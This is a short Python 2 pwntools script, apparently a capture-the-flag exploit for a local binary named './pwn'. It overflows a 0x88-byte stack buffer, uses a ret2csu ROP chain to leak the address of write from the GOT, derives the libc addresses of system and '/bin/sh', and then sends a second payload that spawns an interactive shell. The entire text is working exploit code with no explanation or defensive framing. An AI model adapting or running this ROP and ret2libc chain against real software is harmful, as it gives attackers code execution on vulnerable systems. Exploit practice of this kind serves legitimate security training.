# rdi, rsi, rdx, rcx, r8, r9
from pwn import *

libc = ELF('./libc.so.6')
elf = ELF('./pwn')

pop_rbx_rbp_r12_r13_r14_r15_ret = 0x40061a
rdx_rsi_edi_call_add_pop_6_ret = 0x400600
pop_rdi_ret = 0x400623
vuln = 0x400566
main = 0x400587

# func(args[0], args[1], args[2]) return args[3]
def getROP(func, *args):
	payload = 0x88*'a' + p64(pop_rbx_rbp_r12_r13_r14_r15_ret)
	payload += p64(0) + p64(1) + p64(func) + p64(args[2]) + p64(args[1]) + p64(args[0])
	payload += p64(rdx_rsi_edi_call_add_pop_6_ret) + '\x00'*56 + p64(args[3])
	return payload

payload = getROP(elf.got['write'], 1, elf.got['write'], 8, main)

p = process('./pwn')
p.recvuntil('0123')

#gdb.attach(proc.pidof(p)[0])
p.sendline(payload)

write_addr = u64(p.recv(8))
print '[+]write: ' + hex(write_addr)

system_addr = write_addr - libc.symbols['write'] + libc.symbols['system']
binsh_addr = write_addr - libc.symbols['write'] + next(libc.search('/bin/sh'))
print '[+]system: ' + hex(system_addr)
print '[+]binsh: ' + hex(binsh_addr)

#gdb.attach(proc.pidof(p)[0])
p.recvuntil('0123')
payload = 0x88*'a' + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
#payload = getROP(system_addr, binsh_addr, 0, 0, main) //mov edi, r15d !!!
p.sendline(payload)

p.interactive()
